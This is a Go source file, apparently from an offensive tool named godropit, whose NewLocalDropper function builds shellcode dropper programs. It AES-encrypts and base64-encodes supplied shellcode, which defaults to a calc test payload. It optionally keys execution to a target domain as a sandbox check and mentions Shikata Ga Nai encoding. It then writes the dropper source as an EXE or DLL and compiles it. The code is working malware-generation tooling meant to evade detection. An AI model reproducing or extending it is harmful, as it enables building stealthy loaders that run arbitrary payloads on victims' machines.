package gengo

import (
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/Epictetus24/godropit/internal/gengo/local"
	"github.com/Epictetus24/godropit/pkg/box"
	"github.com/Epictetus24/godropit/pkg/dropfmt"

	"github.com/fatih/color"
)

// Creates and builds a new local dropper.
func NewLocalDropper(input, output, domain, dropname string, delay int, sgn, dll, arch, hold bool) {

	dropname = check(dropname)
	//var archInt int
	var shellcode dropfmt.DropFmt
	/*
		if arch {
			color.Yellow("[gengo]Arch set to x86, please note this is not supported for all droppers.")
			archInt = 32
		} else {
			archInt = 64
		}
	*/

	//strings.ReplaceAll(proc, "\\", "\\\\")

	if input == "CALC" {
		shellcode.Buf = CalcCode
	} else {
		shellcode = GetShellcode(input)
	}
	fmt.Printf(dropname)
	goDrop := local.NewLocal(hold, domain, delay)
	if sgn {
		color.Yellow("Shikata Ga Nai encoding shellcode.")
		//shellcode.SGN(archInt)
	}
	if domain != "" {
		goDrop.Domain = domain
		goDrop.BoxChkFunc = box.DomKeyFunc
		goDrop.BoxChkImp = box.BoxChkImp
		goDrop.ChkBox = box.CheckDom
	} else {
		goDrop.Domain = ""
	}

	//Format Shellcode for dropper.
	shellcode.AESEncrypt()
	goDrop.BufStr = shellcode.ToB64()
	goDrop.KeyStr = shellcode.KeyB64()
	scFilepath := filepath.Join(output, dropname+"_encryptedB64.txt")
	//Write shellcode files in case they are needed later.
	scFile, err := os.Create(scFilepath)
	if err != nil {
		log.Fatalf("Error creating shellcode file: %v ", err)

	}
	scFile.WriteString("ShellcodeKey: " + goDrop.KeyStr + "\n")
	scFile.WriteString("ShellcodeBuf:\n" + goDrop.BufStr)
	scFile.Close()
	binFilepath := filepath.Join(output, dropname+"_Clear.bin")
	fmt.Println(binFilepath)
	binFile, err := os.Create(binFilepath)
	if err != nil {
		log.Fatalf("Error creating shellcode file: %v ", err)

	}
	binFile.Write(shellcode.Buf)
	binFile.Close()

	//write our dropper template.
	dropfilename := dropname + ".go"
	dropFilepath := filepath.Join(output, dropfilename)
	dropperFile, err := os.Create(dropFilepath)
	if err != nil {
		log.Fatalf("Error creating dropper file: %v ", err)
	}

	if dll {
		err = goDrop.WriteSharedSrc(dropperFile)
		if err != nil {
			log.Fatalf("Error writing dropper source: %v", err)
		}

	} else {
		err = goDrop.WriteSrc(dropperFile)
		if err != nil {
			log.Fatalf("Error writing dropper source: %v", err)
		}

	}

	dropperFile.Close()
	color.Green("Dropper src written to : %s\n", dropFilepath)

	err = buildInstruct(output, dropfilename, dll, arch)
	if err != nil {
		log.Fatal(err)

	}

	wd, _ := os.Getwd()

	if Leet {
		//buildFileGo(output, dropname, dll, arch)

	}

	buildFileGo(output, dropfilename, dll, arch)

	os.Chdir(wd)

}
